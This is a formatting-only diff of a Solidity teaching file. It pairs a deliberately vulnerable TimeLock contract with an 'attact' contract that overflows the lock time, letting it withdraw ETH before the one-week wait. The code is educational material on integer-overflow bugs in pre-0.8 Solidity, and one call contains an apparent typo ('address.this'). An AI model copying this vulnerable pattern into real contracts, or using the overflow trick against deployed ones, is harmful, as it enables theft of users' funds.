@@ -1,7 +1,8 @@
 // SPDX-License-Identifier: SEE LICENSE IN LICENSE
 pragma solidity ^0.7.6;
 
-/** Vulnerability
+/**
+ * Vulnerability
  * Solidity<0.8
  *
  * Integers is Solidity overflow/underflow without any errors
@@ -26,7 +27,6 @@ pragma solidity ^0.7.6;
  * Attact caused the TimeLock.lockTime to overFlow and was able to withdraw before the 1 week waiting period.
  *
  */
-
 contract TimeLock {
     mapping(address => uint256) public balances;
     mapping(address => uint256) public locktime;
@@ -46,7 +46,7 @@ contract TimeLock {
 
         uint256 amount = balances[msg.sender];
         balances[msg.sender] = 0;
-        (bool sent, ) = msg.sender.call{value: amount}("");
+        (bool sent,) = msg.sender.call{value: amount}("");
         require(sent, "Failed to send eth");
     }
 }
@@ -69,9 +69,7 @@ contract attact {
          * 2^256 = type(uint).max +1
          * x = type(uint).max + 1 -t
          */
-        timelock.increaseblockTime(
-            type(uint256).max + 1 - timelock.locktime(address.this)
-        );
+        timelock.increaseblockTime(type(uint256).max + 1 - timelock.locktime(address.this));
         timelock.withdraw();
     }
 }
